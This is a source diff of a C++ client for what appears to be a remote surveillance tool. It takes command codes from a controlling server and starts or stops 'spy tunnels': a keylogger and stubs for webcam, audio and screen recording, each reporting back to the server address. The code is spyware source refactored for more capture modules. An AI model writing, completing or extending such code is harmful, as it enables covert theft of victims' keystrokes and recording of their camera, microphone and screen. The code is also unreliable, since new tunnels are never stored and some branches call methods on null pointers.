@@ -1,8 +1,40 @@
 #include "client.hpp"
 
-void* helper_thread(void* arg) {
-    CLSpyTunnel* tunnel = static_cast<CLSpyTunnel*>(arg);
+void* helper_thread(void* __arg) {
+    CLSpyTunnel* tunnel = static_cast<CLSpyTunnel*>(__arg);
     tunnel->run();
+}
+
+TunnelContainer::TunnelContainer(CommandCode __tunnel_code) {
+    p_tunnel_ = nullptr;
+    tunnel_code_ = __tunnel_code;
+    next_ = nullptr;
+}
+
+TunnelContainer::~TunnelContainer() {
+    if (p_tunnel_ != nullptr) {
+        p_tunnel_->shutdown();
+        delete p_tunnel_;
+        if (thread_running_) {
+            pthread_join(tunnel_thread_, nullptr);
+        }
+    }
+    if (next_ != nullptr) {
+        delete next_;
+    }
+}
+
+// Find the tunnel by tunnel code
+TunnelContainer* TunnelContainer::find(CommandCode __tunnel_code) {
+    TunnelContainer* current = this;
+    while (current != nullptr) {
+        if (current->tunnel_code_ == __tunnel_code) {
+            return current;
+        }
+        current = current->next_;
+    }
+
+    return nullptr;
 }
 
 Client::Client(const char* __ip, const int __port): port_(__port), socket_(-1) {
@@ -12,10 +44,24 @@ Client::Client(const char* __ip, const int __port): port_(__port), socket_(-1) {
             break;
         }
     }
+    
+    TunnelContainer* current = nullptr;;
+    tunnel_conts_ = nullptr;
 
-    if (init() < 0) {
-        return;
+    for (int i=0;i<TUNNEL_NUMS;i++) {
+        CommandCode tunnel_code = static_cast<CommandCode>(1 << i+2);
+        TunnelContainer* new_tunnel = new TunnelContainer(tunnel_code);
+
+        if (tunnel_conts_ == nullptr) {
+            tunnel_conts_ = new_tunnel;
+            current = tunnel_conts_;
+        } else {
+            current->next_ = new_tunnel;
+            current = new_tunnel;
+        }
+    
     }
+
 
     start();
 }
@@ -37,8 +83,7 @@ int Client::init() {
 void Client::start() {
     uint16_t command;
     char buffer[OUT_SIZE];
-    int bytes_received = 0;
-    int bytes_sent = 0;
+    int rc;
     int error = 0;
     socklen_t len = sizeof(error);
     CommandCode command_code = 0;
@@ -68,70 +113,117 @@ void Client::start() {
             goto retry;
         }
         printf("Connected to server %s:%d\n", ip_, port_);
-        while (!retry_flag_ && !shutdown_flag_) {
-            bytes_received = recv(socket_, &command, sizeof(command), 0);
-            if (bytes_received < 0) {
+
+
+        while (!shutdown_flag_) {
+            rc = recv(socket_, &command, sizeof(command), 0);
+            if (rc < 0) {
                 printf("Error receiving data\n");
                 break;
-            } else if (bytes_received == 0) {
+            } else if (rc == 0) {
                 printf("Server closed connection\n");
                 break;
             }
 
             command_code = static_cast<CommandCode>(command >> 8);
             command_arg = static_cast<int>(command & 0x00FF);
-            switch (command_code) {
-                case TEST:
-                    printf("Received TEST command\n");
-                    retry_flag_ = send_out(socket_, EXEC_SUCCESS);
+
+            if (command_code == TEST) {
+                printf("Received TEST command\n");
+                rc = send_out(socket_, EXEC_SUCCESS);
+                if (rc < 0) {
+                    printf("Error sending data: %s\n", strerror(errno));
                     break;
-                case KILL:
-                    printf("Received KILL command\n");
-                    retry_flag_ = send_out(socket_, EXEC_SUCCESS);
-                    shutdown_flag_ = true;
+                }
+            } else if (command_code == KILL) {
+                printf("Received KILL command\n");
+                rc = send_out(socket_, EXEC_SUCCESS);
+                if (rc < 0) {
+                    printf("Error sending data: %s\n", strerror(errno));
                     break;
-                case KEYLOGGER:
-                    printf("Received KEYLOGGER command\n");
-                    if (command_arg) {
-                        // Start the keylogger
-                        if (keylogger_ == nullptr) {
-                            keylogger_ = new CLKeylogger();
-                            // Start the keylogger in a seperate thread
-                            keylogger_->init(ip_, port_, &shutdown_flag_);
-                            pthread_t keylogger_thread;
-                            if (pthread_create(&keylogger_thread, nullptr, helper_thread, keylogger_) != 0) {
-                                printf("Error creating keylogger thread\n");
-                                delete keylogger_;
-                                keylogger_ = nullptr;
-                                retry_flag_ = send_out(socket_, EXEC_ERROR);
-                                break;
-                            } else {
-                                printf("Keylogger started\n");
-                                retry_flag_ = send_out(socket_, EXEC_SUCCESS);
-                                pthread_detach(keylogger_thread); // Detach the thread to avoid memory leaks
-                            }
-                        } else {
-                            printf("Keylogger already running\n");
-                            retry_flag_ = send_out(socket_, EXEC_ERROR);
+                }
+                shutdown_flag_ = true;
+                break;
+            } else {
+                TunnelContainer* tunnel_cont = tunnel_conts_->find(command_code);
+                CLSpyTunnel* tunnel = tunnel_cont->p_tunnel_;
+
+                if (command_arg>0) {
+                    // Tunnel is already running
+                    if (tunnel != nullptr) {
+                        printf("Tunnel already running\n");
+                        rc = send_out(socket_, EXEC_ERROR);
+                        if (rc < 0) {
+                            printf("Error sending data: %s\n", strerror(errno));
+                            break;
+                        }
+                        continue;
+                    }
+
+                    // Start the tunnel
+                    if (command_code == KEYLOGGER) {
+                        printf("Received KEYLOGGER command\n");
+                        tunnel = new CLKeylogger();
+                    } else if (command_code == WEBCAM_RECORDER) {
+                        printf("Received WEBCAM_RECORDER command\n");
+                    } else if (command_code == AUDIO_RECORDER) {
+                        printf("Received AUDIO_RECORDER command\n");
+                    } else if (command_code == SCREEN_RECORDER) {
+                        printf("Received SCREEN_RECORDER command\n");
+                    } else {
+                        printf("Unknown command: %d\n", command_code);
+                        rc = send_out(socket_, EXEC_ERROR);
+                        if (rc < 0) {
+                            printf("Error sending data: %s\n", strerror(errno));
+                            break;
+                        }
+                        continue;
+                    }
+                    tunnel->init(ip_, port_, &shutdown_flag_);
+                    if (pthread_create(&tunnel_cont->tunnel_thread_, nullptr, helper_thread, tunnel) != 0) {
+                        printf("Error creating tunnel thread\n");
+                        delete tunnel;
+                        tunnel = nullptr;
+                        rc = send_out(socket_, EXEC_ERROR);
+                        if (rc < 0) {
+                            printf("Error sending data: %s\n", strerror(errno));
+                            break;
                         }
                     } else {
-                        // Stop the keylogger
-                        if (keylogger_) {
-                            keylogger_->shutdown();
-                            delete keylogger_;
-                            keylogger_ = nullptr;
-                            retry_flag_ = send_out(socket_, EXEC_SUCCESS);
-                        } else {
-                            printf("Keylogger not running\n");
-                            retry_flag_ = send_out(socket_, EXEC_ERROR);
+                        printf("Tunnel started\n");
+                        tunnel_cont->thread_running_ = true;
+                        rc = send_out(socket_, EXEC_SUCCESS);
+                        if (rc < 0) {
+                            printf("Error sending data: %s\n", strerror(errno));
+                            break;
                         }
                     }
-                    break;
-                default:
-                    printf("Unknown command: %d\n", command_code);
-                    retry_flag_ = send_out(socket_, EXEC_ERROR);
-                    break;
+                } else {
+                    // Tunnel is not running
+                    if (tunnel == nullptr) {
+                        printf("Tunnel not running\n");
+                        rc = send_out(socket_, EXEC_ERROR);
+                        if (rc < 0) {
+                            printf("Error sending data: %s\n", strerror(errno));
+                            break;
+                        }
+                        continue;
+                    }
+
+                    // Stop the tunnel
+                    tunnel->shutdown();
+                    if (tunnel_cont->thread_running_) {
+                        pthread_join(tunnel_cont->tunnel_thread_, nullptr);
+                        tunnel_cont->thread_running_ = false;
+                    }
+                    rc = send_out(socket_, EXEC_SUCCESS);
+                    if (rc < 0) {
+                        printf("Error sending data: %s\n", strerror(errno));
+                        break;
+                    }
+                }
             }
+
         }
         retry:
             if (!shutdown_flag_) {
@@ -147,10 +239,5 @@ void Client::start() {
 void Client::shutdown() {
     printf("Shutting down client\n");
     close(socket_);
-
-    if (keylogger_) {
-        keylogger_->shutdown();
-        delete keylogger_;
-        keylogger_ = nullptr;
-    }
+    delete tunnel_conts_;
 }
